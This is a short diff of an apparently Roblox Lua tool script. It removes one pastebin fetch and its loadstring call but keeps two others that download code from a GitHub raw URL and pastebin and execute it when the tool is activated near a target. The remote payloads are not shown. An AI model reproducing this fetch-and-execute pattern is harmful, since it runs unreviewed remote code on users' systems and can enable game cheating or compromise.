@@ -80,7 +80,6 @@ humanoid.AnimationPlayed:Connect(onAnimationPlayed)
 end
 
 local doScriptContent = game:HttpGet("https://raw.githubusercontent.com/Fromonor/Not/refs/heads/main/Dr")
-local anc = game:HttpGet("https://pastebin.com/raw/X2N70CxD")
 local dam = game:HttpGet("https://pastebin.com/raw/5WSzha14")
 
 tool.Activated:Connect(function()
@@ -169,7 +168,6 @@ tool.Activated:Connect(function()
                         if angle < math.rad(45) then
                             -- Player is close and looking at the target, execute the "Do" script
                             task.spawn(function()
-                                loadstring(anc)()
                                 loadstring(doScriptContent)()
                                 loadstring(dam)()
                             end)
